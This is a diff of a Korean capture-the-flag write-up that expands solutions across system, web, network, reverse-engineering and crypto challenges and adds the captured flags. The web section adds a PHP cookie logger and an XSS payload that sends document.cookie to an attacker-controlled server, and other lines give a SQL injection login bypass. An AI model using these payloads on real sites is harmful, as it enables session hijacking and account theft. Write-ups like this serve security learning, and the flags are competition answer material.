@@ -3,30 +3,43 @@
 
 ![](./bingo.png)
 
-## 법률이랑 일반이였나 하는 위에 2줄
-구글링
+## 법률, 일반(위에 2줄)
+잘 모르는 문제도 구글링하면 (진짜로) 5분도 안되서 슥삭할 수 있다.
 
 ## 시스템 1
+커맨드인젝션이 발생한다. 삽질기랑 풀이는 나중에 쓰도록 하겠다.
 
 ## 시스템 2
 `exec()`로 명령어를 입력받아 쉘에서 실행하는 프로그램이다.
 
-`cat flag` 했더니 플래그가 나왔다. 약간 어이없었는데 플래그 내용도 fake love 어쩌고 하길래 페이크인 줄 알았는데 진짜였다(...).
+아무런 필터링 없이 그냥 `cat flag` 했더니 플래그가 나왔다. 약간 어이없었는데 플래그 내용도 fake love 어쩌고 하길래 페이크인 줄 알았는데 진짜였다(...).
+
+> `FLAG{Fak3_L0v3_i5_7h3_s3v3n733n7h_n0n-Eng1i5h_50ng}`
 
 ## 시스템 3
 
 ## 웹 1
-`' OR '1'=='1`이였나 했더니 `alert()`로 플래그가 나왔다.
+매우 허술해 보이는 로그인 페이지가 나타났다. `' OR '1'=='1`이였나 했더니 `alert()`로 플래그가 나왔다.
+
+> `FLAG{I_4m_k1ng_0f_tH2_w0rlD!}`
 
 ## 웹 2
-소스를 봤더니 이상한 이미지를 로드하고 막 나눠서 뿌린다. 원래 이미지의 src를 구해서 들어가면 플래그가 적혀있다.
+소스를 봤더니 이상한 이미지를 로드하고 막 나눠서 뿌린다. 원래 이미지의 src를 구해서 들어가면(console에서 뚝딱할 수 있다) 플래그가 적혀있다.
+
+> `FLAG{???}`
 
 ## 웹 3
 게시글을 올리고 바로 볼 수 있는데 XSS가 발생한다. 
 
 쿠키를 확인해보니 여기에 플래그가 들어간다! 이러길래 여기에 스크립트를 올려놓으면 쿠키가 설정된 봇이 읽는 것 같았다.
 
-서버에 `cookie.php`를 올려두고 `location.href=` 어쩌고 할려고 했는데 `location`이 들어가면 XSS라면서 제대로 등록되지 않는다.
+```php
+<!-- cookie.php -->
+<!-- usage : <script>location.href = "http://{server-addr}/cookie?c=" + document.cookie;</script> -->
+<?php fwrite(fopen('cookie.txt', 'a'), $_GET['c'] . "\n"); ?>
+```
+
+서버에 [cookie.php](https://gist.github.com/junhoyeo/fbaae934e12f67036a1c056c6c075348)를 올려두고 `location.href=` 어쩌고 할려고 했는데 `location`이 들어가면 XSS라면서 제대로 등록되지 않는다.
 `XMLHttpRequest`로 GET 리퀘스트를 보내는 방법으로 쿠키 탈취를 시도했는데 `'`, `"`가 필터링되어서 없어져 버린다.
 
 ```js
@@ -64,22 +77,26 @@ flag=Flag is Here!!
 
 서버의 `cookie.txt`를 보니까 플래그가 나와있었다.
 
-`w3_give_@dviCe_bUT_w3_CaNnoT_give_C0NdUct`
+> `w3_give_@dviCe_bUT_w3_CaNnoT_give_C0NdUct`
 
 ## 네트워크 1
+검색하고 follow TCP stream 하면 조각조각 나온다.
+
+> `flag{N3tw0rk_Ch@llenge_SOlv3d!_Congr@tz!!}`
 
 ## 네트워크 2
+드래곤볼하라는 문제인데 결국 못풀었다.
 
 ## 네트워크 3
 3단계로 구성되어 있다.
 
-### 1
+### 1단계: 기본 정보 확인 
 ```
 Router> show version
     [+] FLAG1{ C15c0_Pack3t_Tr4c3r_H4ve_U }
 ```
 
-### 2
+### 2단계: config 모드에서 기본 설정
 ```
 Router> enable
 Router# configure terminal
@@ -92,7 +109,7 @@ Router(config)# enable password whoisthewinnerofkeris2018
     FLAG2{ Ev3r_u5ed_ittttt? }
 ```
 
-### 3
+### 3단계: 암호화된 password 확인
 ```
 Router(config)# exit
 Router# show routing-config
@@ -100,7 +117,8 @@ Router# show routing-config
 ```
 
 `flag1_flag2_encrypt1234` 형식이다.
-`C15c0_Pack3t_Tr4c3r_H4ve_U_Ev3r_u5ed_ittttt?_08364441000A111F171C050A242E3627353E27010E0551510701`
+
+> `C15c0_Pack3t_Tr4c3r_H4ve_U_Ev3r_u5ed_ittttt?_08364441000A111F171C050A242E3627353E27010E0551510701`
 
 ## 역공학 1
 ```bash
@@ -151,12 +169,19 @@ gdb-peda$
 
 패스워드를 정확하게 입력하면 플래그를 준다.
 
+> `FLAG{???}`
+
 ## 역공학 2
+[여기](https://github.com/cokia/CTF-Writeup/tree/master/2018%20%E1%84%8C%E1%85%A5%E1%86%BC%E1%84%87%E1%85%A9%E1%84%87%E1%85%A9%E1%84%92%E1%85%A9%20%E1%84%8B%E1%85%A7%E1%86%BC%E1%84%8C%E1%85%A2%E1%84%80%E1%85%AD%E1%84%8B%E1%85%B2%E1%86%A8%E1%84%8B%E1%85%AF%E1%86%AB%20(keris)%202018%20%E1%84%8B%E1%85%A8%E1%84%89%E1%85%A5%E1%86%AB#2rev2---%EB%A7%9D%EA%B3%A0%EA%B5%AC%EC%95%84%EB%B0%94-400p)에서처럼 입력받은 메세지(플래그)가 맞는지 확인하는 로직이 있다. 건드리지도 않았다가 끝나고 풀었다. [익스 참고](./mango.py)
+
+> `Go_4head_make_YouR_DaY^^X`
 
 ## 역공학 3
 
 ## 암호학 1
-`today is cloudy. so my feeling is not good either.`
+파이썬 오픈소스인 xor_solver를 이용해서 풀었다. [익스 참고](./exploit.py)
+
+> `today is cloudy. so my feeling is not good either.`
 
 ## 암호학 2
 뚜까
